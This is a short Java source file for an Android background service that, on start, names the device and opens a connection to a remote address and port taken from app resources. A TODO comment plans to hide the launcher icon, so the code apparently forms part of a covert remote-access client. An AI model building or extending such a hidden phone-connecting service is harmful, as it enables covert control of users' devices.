package com.example.bane;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import com.example.bane.connection.Connection;
import com.example.bane.bane.storage.Storage;

// TODO: diableLauncherIcon
public class BaneService extends Service {

    public static Context context;

    public void onCreate() {
        super.onCreate();
        context = this;
        Storage storage = new Storage(this);
        String name = "stecco";//"Unknown " + new Date();
        if(!storage.isStored("name"))
            storage.set("name",name);
        else
            name = storage.get("name",name);
        new Thread(Connection.Connection(name,BaneService.context.getResources().getString(R.string.address),Integer.parseInt(BaneService.context.getResources().getString(R.string.port)))).start();
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

}

